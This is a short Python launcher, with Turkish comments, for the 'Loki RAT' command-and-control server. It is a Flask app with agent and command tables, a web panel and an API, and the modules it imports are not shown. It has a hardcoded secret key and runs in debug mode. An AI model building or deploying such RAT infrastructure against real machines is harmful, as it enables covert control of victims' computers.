#!/usr/bin/env python3
"""
Güncellenmiş Loki RAT sunucusu
"""

import os
import sys

# Server dizinini Python path'e ekle
current_dir = os.path.dirname(os.path.abspath(__file__))
server_dir = os.path.join(current_dir, 'server')
sys.path.insert(0, server_dir)

from flask import Flask
from server.models import db, Agent, Command
from server.webui import webui
from server.api import api

# Flask uygulaması oluştur
app = Flask(__name__)
app.secret_key = 'loki-secret-key-2025'

# Veritabanı konfigürasyonu
db_path = os.path.join(current_dir, 'server', 'instance', 'loki.db')
app.config['SQLALCHEMY_DATABASE_URI'] = f'sqlite:///{db_path}'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['UPLOAD_FOLDER'] = os.path.join(server_dir, 'webui', 'static', 'uploads')

# Upload klasörünü oluştur
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

# Veritabanını başlat
db.init_app(app)

# Blueprint'leri kaydet
app.register_blueprint(webui)
app.register_blueprint(api, url_prefix="/api")

@app.after_request
def headers(response):
    response.headers["Server"] = "Loki"
    return response

if __name__ == '__main__':
    with app.app_context():
        # Veritabanı tablolarını oluştur (eğer yoksa)
        db.create_all()
        
    print("Loki RAT Sunucusu başlatılıyor...")
    print(f"Veritabanı: {db_path}")
    print("Web arayüzü: http://127.0.0.1:8080")
    
    app.run(host='127.0.0.1', port=8080, debug=True, threaded=True)
